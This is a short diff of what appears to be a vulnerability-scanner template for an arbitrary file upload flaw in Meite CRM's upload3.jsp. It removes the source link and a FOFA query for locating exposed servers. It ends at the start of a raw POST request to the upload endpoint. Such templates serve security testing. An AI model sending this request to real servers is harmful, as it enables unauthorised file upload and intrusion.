@@ -3,12 +3,8 @@ info:
   name: 美特CRM upload3.jsp 存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/apmqnnk38eka2ml4'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: apmqnnk38eka2ml4
-    fofa: body="/common/scripts/basic.js"
 http:
 - raw:
   - 'POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E HTTP/1.1
